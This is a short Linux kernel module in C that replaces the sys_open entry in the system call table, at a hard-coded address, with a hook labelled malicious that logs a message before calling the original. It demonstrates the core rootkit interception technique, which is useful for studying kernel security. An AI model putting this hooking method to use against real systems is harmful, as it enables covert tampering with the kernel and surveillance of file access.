#include <linux/module.h>
#include <linux/fs.h>          // do_sys_open
#include <linux/fcntl.h>       // force_o_largefile
#include <asm/unistd.h>        // __NR_open
// #include <linux/syscalls.h> // original sys_open prototype

unsigned long *sys_call_table = (unsigned long*)0xc001f7c4; // objdump -D vmlinux

typedef asmlinkage long (*sys_open_type)(const char __user *filename, int flags, umode_t mode);
sys_open_type original_sys_open;

asmlinkage long malicious_sys_open(const char __user * filename, int flags, umode_t mode)
{
    pr_err("!!! Executing malicious open syscall !!!\n");
    return original_sys_open(filename, flags, mode);
}

static int hook_syscall_init(void)
{
    pr_err("Syscall hooking module init start\n");
    original_sys_open = (sys_open_type)sys_call_table[__NR_open];
    sys_call_table[__NR_open] = (unsigned long)&malicious_sys_open;
    pr_err("Syscall hooking module init finish\n");
    return 0;
}

static void hook_syscall_exit(void)
{
    pr_err("Syscall hooking module exit start\n");
    sys_call_table[__NR_open] = (unsigned long)original_sys_open;
    pr_err("Syscall hooking module exit finish\n");
}

module_init(hook_syscall_init);
module_exit(hook_syscall_exit);
